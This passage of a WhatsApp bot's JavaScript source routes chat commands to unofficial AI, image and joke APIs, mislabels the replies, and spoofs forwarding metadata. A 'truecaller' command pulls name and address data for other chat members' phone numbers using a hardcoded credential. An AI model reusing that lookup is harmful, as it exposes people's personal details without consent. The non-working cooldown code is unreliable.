              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} how to make girl pregnant`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Claude AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break 
    case 'hercai-cartoon': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Cartoon\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Animefy\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Lexica\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Prodia\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Simurg\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Raava\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} a girl singing in public`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Herc AI Shonin\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
    case 'realistic': case '3dmodel': {
    	if (!text) return replygcveran(`*Example:* ${prefix + command} blue sky`)
    let lastUsed = 0;
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygcveran("Cooldown 10 seconds, try again later")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: VeranBotInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcveran("`GPT Not Responding`")
  }
}
break
case 'photoleap': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygcveran("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygcveran("`*Error*`");
  }
}
break
case 'ai': case 'gpt': case 'openai': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Open Ai\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break

// New Cmds in aimenu

case 'chatgpt4': {
	if (!text) return replygcveran(`*• Example:* ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://api.vihangayt.com/ai/gpt4-v2?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Open Ai\n\n' + gpt.data
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcveran("`*Error*`")
}
}
    break
                

case 'checkgpt': {
  if (!text) return replygcveran(`*• Example:* ${prefix + command} input your text`);   
  try {
    // Fetch the result from the text detector API
    let apiUrl = `${global.api}ai/text-detector?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);

    // Check if the response is okay
    if (!response.ok) {
      return replygcveran('❌ Failed to analyze the text. Please try again.');
    }

    let data = await response.json();
    
    // Prepare feedback based on the result
    let feedback = `*🤖 GPT Text Analysis*\n\n`;
    feedback += `*📝 Input Text:* \n_${data.result.input_text}_\n\n`;
    feedback += `*🌐 Detected Language:* \n_${data.result.detected_language}_\n\n`;
    feedback += `*💡 AI Detection Feedback:* \n_${data.result.feedback}_\n\n`;
    feedback += `*📊 AI Likelihood:* \n_${data.result.isHuman}% likely human-generated_\n\n`;
    feedback += `*💬 Additional Feedback:* \n_${data.result.additional_feedback}_\n`;

    // Prepare the message to send
    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: feedback
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
              ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender], 
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    // Send the message
    await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch (e) {
    console.error(e);
    return replygcveran("❗ *Error analyzing the text. Please try again.*");
  }
}
break;
                
                
           
 case 'darky': {
  if (!text) return replygcveran(`*• Example:* ${prefix + command} write me a simple code of python`);

  try {
    // Fetch data from the API
    let response = await (await fetch(`https://evlgpt.onrender.com/egpt?prompt=${encodeURIComponent(text)}`)).json();
    
    // Replace "GURU" with "VERAN" in the message
    let message = response.message.replace(/GURUGPT V1/g, '-TECH-HUB');
    
    // Generate and send the message
    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '> \n\n' + message
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
              ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender],
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch(e) {
    return replygcveran("`*Error*`");
  }
}
break;

case 'bing': {
  if (!text) return replygcveran(`*• Example:* ${prefix + command} hello`);

  try {
    // Fetch data from the API
    let apiUrl = `https://api.guruapi.tech/ai/bing?username=string&query=${encodeURIComponent(text)}`;
    let response = await (await fetch(apiUrl)).json();
    
    // Replace "Guru sensei" with "Veran" in the response
    let message = response.msg.replace(/Guru sensei/g, 'Veran');

    // Generate and send the message
    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '> Veran\n\n' + message
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
              ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender],
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch(e) {
    return replygcveran("`*Error*`");
  }
}
break;

    case 'mathsai': {
      if (!text) return replygcveran(`*• Example:* ${prefix + command} what is your name`);   
            try {
    let gpt = await (await fetch(`${global.api}ai/math?apikey=${global.id}&prompt=${text}`)).json()
    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
            "messageContextInfo": {
              "deviceListMetadata": {},
              "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
              body: proto.Message.InteractiveMessage.Body.create({
                text: '> Maths Ai\n\n' + gpt.result
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: botname
              }),
              header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
              ...await prepareWAMessageMedia({ image:  fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [{
                "name": "quick_reply",
                  "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
                }],
              }),
              contextInfo: {
                      mentionedJid: [m.sender], 
                      forwardingScore: 999,
                      isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: '100000000000000000@newsletter',
                      newsletterName: ownername,
                      serverMessageId: 143
                    }
                    }
           })
        }
      }
    }, { quoted: m })
    await VeranBotInc.relayMessage(m.chat, msgs.message, {})
     } catch(e) {
     return replygcveran("`*Error*`")
    }
    }
        break
    

        case 'yomamajoke': {
          try {
              // Fetch a yo mama joke from the API
              let res = await fetch(`https://yomamaindra.onrender.com/jokes`);
      
              if (!res.ok) {
                  throw new Error(`API request failed with status ${res.status}`);
              }
      
              let json = await res.json();
      
              // Extract the joke from the response
              let yoMamaJoke = `${json.joke}`;
      
              // Create the message with design
              let msgs = generateWAMessageFromContent(m.chat, {
                  viewOnceMessage: {
                      message: {
                          "messageContextInfo": {
                              "deviceListMetadata": {},
                              "deviceListMetadataVersion": 2
                          },
                          interactiveMessage: proto.Message.InteractiveMessage.create({
                              body: proto.Message.InteractiveMessage.Body.create({
                                  text: yoMamaJoke
                              }),
                              footer: proto.Message.InteractiveMessage.Footer.create({
                                  text: botname
                              }),
                              header: proto.Message.InteractiveMessage.Header.create({
                                  hasMediaAttachment: false,
                                  ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                              }),
                              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                  buttons: [{
                                      "name": "quick_reply",
                                      "buttonParamsJson": JSON.stringify({
                                          "display_text": "😂 Another Joke",
                                          "id": "another_joke",
                                          "command": "yomamajoke"
                                      })
                                  }],
                              }),
                              contextInfo: {
                                  mentionedJid: [m.sender], 
                                  forwardingScore: 999,
                                  isForwarded: true,
                                  forwardedNewsletterMessageInfo: {
                                      newsletterJid: '100000000000000000@newsletter',
                                      newsletterName: ownername,
                                      serverMessageId: 143
                                  }
                              }
                          })
                      }
                  }
              }, { quoted: m });
      
              // Send the message
              return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
          } catch (error) {
              console.error('API Fetch Error:', error);
              return await VeranBotInc.sendText(m.chat, "An error occurred while fetching the joke. Please try again.");
          }
      }
      break;
      
      case 'truecaller': {
        let phoneNumber = '';
        if (text) {
          phoneNumber = text.replace(/[^0-9]/g, '');
        } else if (m.quoted) {
          phoneNumber = m.quoted.sender.replace(/[^0-9]/g, '');
        } else if (m.mentionedJid && m.mentionedJid[0]) {
          phoneNumber = m.mentionedJid[0].replace(/[^0-9]/g, '');
        } else {
          return await VeranBotInc.sendText(m.chat, "Please provide a number in international format without +, quote a user, or mention a user.");
        }
      
        try {
          const installationId = 'a1i0Z--jzbJC6kx-2_s3OMNW2X7O2Qe3ca-XwmHexijCBA6MNKAO2ciUw756zhWj';
          const apiUrl = `https://truecaller-api.vercel.app/search?phone=${encodeURIComponent(phoneNumber)}&id=${installationId}`;
      
          let response = await fetch(apiUrl);
          if (!response.ok) {
            throw new Error(`API request failed with status ${response.status}`);
          }
      
          let json = await response.json();
          json.creator = 'GURU';
      
          let details = '';
          for (let prop in json) {
            if (prop === 'flagURL') continue;
      
            if (prop === 'addresses') {
              details += `⚝ *${prop}:*\n`;
              for (let addressProp in json[prop][0]) {
                details += `  ⚝ *${addressProp}:* ${json[prop][0][addressProp]}\n`;
              }
            } else if (prop === 'countryDetails') {
              details += `⚝ *${prop}:*\n`;
              for (let countryProp in json[prop]) {
                if (Array.isArray(json[prop][countryProp])) {
                  details += `  ⚝ *${countryProp}:* ${json[prop][countryProp].join(', ')}\n`;
                } else {
                  details += `  ⚝ *${countryProp}:* ${json[prop][countryProp]}\n`;
                }
              }
            } else {
              if (prop !== 'flagURL') {
                details += `⚝ *${prop}:* ${json[prop]}\n`;
              }
            }
          }
      
          // Create the message with design
          let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: details
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: botname
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    hasMediaAttachment: false,
                    ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply",
                      "buttonParamsJson": `{\"display_text\":\"🔍 Search Another\",\"id\":\"search_another\"}`
                    }],
                  }),
                  contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: '100000000000000000@newsletter',
                      newsletterName: ownername,
                      serverMessageId: 143
                    }
                  }
                })
              }
            }
          }, { quoted: m });
      
          // Send the message
          return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
        } catch (error) {
          console.error('API Fetch Error:', error);
